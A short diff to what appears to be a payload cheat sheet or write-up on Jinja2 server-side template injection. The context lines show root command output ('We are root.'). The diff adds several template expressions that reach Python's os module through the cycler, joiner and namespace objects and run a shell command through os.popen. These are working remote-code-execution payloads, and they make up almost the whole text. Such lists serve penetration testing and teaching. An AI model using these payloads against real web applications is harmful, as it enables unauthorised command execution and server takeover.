@@ -244,7 +244,15 @@ uid=0(root) gid=0(root) groups=0(root)
 
 We are root.
 
-Aa
+Aa2
 ```
-{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
 ```
